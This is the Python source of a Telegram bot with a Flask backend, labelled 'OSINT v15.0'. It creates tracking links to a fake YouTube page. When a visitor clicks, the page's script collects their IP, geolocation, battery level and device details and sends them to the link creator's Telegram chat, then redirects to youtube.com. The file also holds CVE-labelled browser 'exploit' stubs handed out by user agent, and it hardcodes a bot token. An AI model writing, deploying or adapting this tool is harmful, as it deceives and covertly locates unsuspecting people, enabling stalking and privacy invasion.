import asyncio, threading, os, requests, json, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
# УБЕДИСЬ, ЧТО ТУТ НЕТ СЛЭША В КОНЦЕ
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 

# --- БАЗА ПЕЙЛОАДОВ ---
PAYLOADS = {
    "CHROME": "// [CVE-2024-7971] V8 Type Confusion\nlet a = [1.1, 2.2]; function exploit(o) { a[0] = o; }",
    "SAFARI": "// [CVE-2023-32409] WebKit RCE\n// Удаленное выполнение кода (iOS/macOS).",
    "OTHER": "// Прямых векторов не найдено. Используйте фишинг."
}

# --- HTML (МАКСИМАЛЬНО ПРОСТОЙ И РАБОЧИЙ) ---
HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta property="og:title" content="YouTube: Новое видео">
    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;" onclick="scan()">
    <div style="text-align:center;border:1px solid #333;padding:50px;cursor:pointer;">
        <div style="width:0;height:0;border-top:20px solid transparent;border-left:30px solid #fff;border-bottom:20px solid transparent;margin:0 auto 20px;"></div>
        <button style="background:#f00;color:#fff;border:none;padding:10px 20px;font-weight:bold;cursor:pointer;">СМОТРЕТЬ</button>
    </div>
<script>
async function scan() {
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, plat: navigator.platform, res: screen.width+"x"+screen.height };
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "%"; } catch(e) {}
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((p) => { 
            d.gps = p.coords.latitude+","+p.coords.longitude; send(d); 
        }, () => { send(d); }, {timeout:3000});
    } else { send(d); }
    setTimeout(() => { send(d); }, 4000);
}
function send(d) {
    if(window.s) return; window.s = true;
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { location.href = "https://youtube.com"; });
}
</script>
</body>
</html>
"""

# --- МАРШРУТЫ (100% ВАРИАНТ) ---

@app.route('/', strict_slashes=False)
def home():
    # Ответ для Cron-job
    return "OK_200", 200

@app.route('/v/<aid>', strict_slashes=False)
def trap(aid):
    # Упростили путь до /v/ID
    return render_template_string(HTML_TRAP, aid=aid)

@app.route('/catch', methods=['POST'], strict_slashes=False)
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    
    ua = d.get('ua', '')
    p_key = "CHROME" if "Chrome" in ua else "SAFARI" if "Safari" in ua else "OTHER"
    exploit_vault[token] = PAYLOADS.get(p_key)

    report = (
        f"🚨 **ЦЕЛЬ В СЕТИ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ips}`\n"
        f"📍 **ГЕО:** `{d.get('gps', 'N/A')}`\n"
        f"🔗 [Карта](https://www.google.com/maps?q={d.get('gps')})\n"
        f"💻 **UA:** `{ua[:40]}...`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **КЛЮЧ:** `{token}`\n"
        f"━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🚀 Создать ссылку")
    await message.answer("💀 **OSINT v15.0**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🚀 Создать ссылку")
async def create(message: types.Message):
    # Новая упрощенная ссылка
    link = f"{BASE_URL}/v/{message.from_user.id}"
    await message.answer(f"✅ **Ссылка:**\n`{link}`")

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    token = message.text.strip().upper()
    if token in exploit_vault:
        await message.answer(f"🔓 **КОД:**\n```javascript\n{exploit_vault[token]}\n```")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
